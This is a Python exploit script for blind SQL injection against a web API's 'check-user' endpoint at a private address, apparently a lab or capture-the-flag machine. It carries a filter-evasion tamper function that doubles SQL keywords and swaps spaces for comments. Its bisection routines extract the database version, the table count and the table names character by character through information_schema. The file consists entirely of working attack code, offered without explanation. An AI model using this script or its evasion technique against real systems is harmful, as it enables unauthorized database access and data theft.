#!/usr/bin/python3

import requests
import json
import sys
from urllib.parse import quote_plus

# Proxy settings
proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Enhanced tamper function to obfuscate payloads
def tamper(payload):
    if payload:
        replacements = {
            " ": "/*/**/*/",
            "AND": "AANDND",
            "and": "AANDND",
            "OR": "OORR",
            "or": "OORR",
            "LIMIT": "LLIMITIMIT",
            "limit": "LLIMITIMIT",
            "OFFSET": "OOFFSETFFSET",
            "offset": "OOFFSETFFSET",
            "WHERE": "WWHEREHERE",
            "where": "WWHEREHERE",
            "SELECT": "SSELECTELECT",
            "select": "SSELECTELECT",
            "UPDATE": "UUPDATEPDATE",
            "update": "UUPDATEPDATE",
            "DELETE": "DDELETEELETE",
            "delete": "DDELETEELETE",
            "DROP": "DDROPROP",
            "drop": "DDROPROP",
            "CREATE": "CCREATEREATE",
            "create": "CCREATEREATE",
            "INSERT": "IINSERTNSERT",
            "insert": "IINSERTNSERT",
            "FUNCTION": "FFUNCTIONUNCTION",
            "function": "FFUNCTIONUNCTION",
            "CAST": "CCASTAST",
            "cast": "CCASTAST",
            "ASCII": "AASCIISCII",
            "ascii": "AASCIISCII",
            "SUBSTRING": "SSUBSTRINGUBSTRING",
            "substring": "SSUBSTRINGUBSTRING",
            "VARCHAR": "VVARCHARARCHAR",
            "varchar": "VVARCHARARCHAR",
            "LENGTH": "LLENGTHENGTH",
            "length": "LLENGTHENGTH",
        }

        for key, value in replacements.items():
            payload = payload.replace(key, value)
    return payload

# Checks if query `q` evaluates as `true` or `false`
def oracle(q):
    query = f"admin' AND ({q}) -- -"
    tampered_query = quote_plus(tamper(query))
    r = requests.get(f"http://10.129.231.66:8080/api/v1/check-user?u={tampered_query}", proxies=proxy)
    j = json.loads(r.text)
    return j['exists']


# Function to dump a string (bisection logic)
def dump_string(query, length):
    result = ""
    for i in range(1, length + 1):
        low, high, found = 0, 127, False
        while low <= high:
            mid = (low + high) // 2
            if oracle(f"ASCII(SUBSTRING({query},{i},1)) BETWEEN {low} AND {mid}"):
                high, found = mid - 1, True
            else:
                low = mid + 1
        if not found:
            print("\n[!] No new character found, stopping.")
            break
        result += chr(low)
        print(chr(low), end='', flush=True)
    return result

# Function to get the length of the current database name
def get_db_name_length():
    length = 0
    while not oracle(f"LENGTH(version())={length}"):
        length += 1
    return length

# Function to get the current database name
def get_db_name():
    db_name_length = get_db_name_length()
    print(f"[*] Database name length = {db_name_length}")
    print("[*] Database name = ", end='', flush=True)
    db_name = dump_string("version()", db_name_length)
    print()
    return db_name

# Function to get the number of tables in the current database
def get_num_tables(db_name):
    num_tables = 0
    while not oracle(f"(SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{db_name}')={num_tables}"):
        num_tables += 1
    return num_tables

# Function to get table names
def get_table_names(db_name, num_tables):
    table_names = []
    for i in range(num_tables):
        table_name_length = 0
        while not oracle(f"(SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_catalog='{db_name}' ORDER BY table_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)={table_name_length}"):
            table_name_length += 1
        print(f"[+] Table {i} name length = {table_name_length}")
        print(f"[+] Table {i} name = ", end='', flush=True)
        table_name = dump_string(f"(SELECT table_name FROM information_schema.tables WHERE table_catalog='{db_name}' ORDER BY table_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)", table_name_length)
        table_names.append(table_name)
        print()
    return table_names

# Main function to coordinate the process
def main():
    db_name = get_db_name()
    num_tables = get_num_tables(db_name)
    print(f"[+] Num of tables = {num_tables}")
    table_names = get_table_names(db_name, num_tables)

if __name__ == "__main__":
    main()
